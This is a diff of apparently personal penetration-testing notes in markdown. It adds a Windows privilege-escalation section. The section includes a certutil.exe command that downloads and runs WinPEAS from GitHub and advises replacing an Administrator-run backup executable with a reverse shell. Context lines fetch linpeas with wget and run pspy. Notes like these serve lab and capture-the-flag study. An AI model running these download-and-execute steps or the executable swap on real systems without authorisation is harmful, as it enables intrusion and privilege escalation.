@@ -90,8 +90,7 @@ smbclient \\\\${TARGET}\\${SHARE_NAME}
 get ${FILENAME}
 ```
 
-
-## Privilege Escalation
+## Privilege Escalation (Linux)
 
 > Quick Notes:
 >
@@ -144,4 +143,24 @@ wget -O- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpea
 
 ```
 ./pspy64 -pf -i 1000
+```
+
+## Privilege Escalation (Windows)
+
+1) Check your privileges
+
+```
+whoami /priv
+```
+
+2) Check for a `Backup` dir on the C drive. Sometimes there are scheduled backup jobs running as Administrator. If yes, replace the executable with a reverse shell.
+
+3) Run WinPEAS
+
+```
+certutil.exe -urlcache -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe winpeasany.exe
+```
+
+```
+winpeasany.exe
 ```
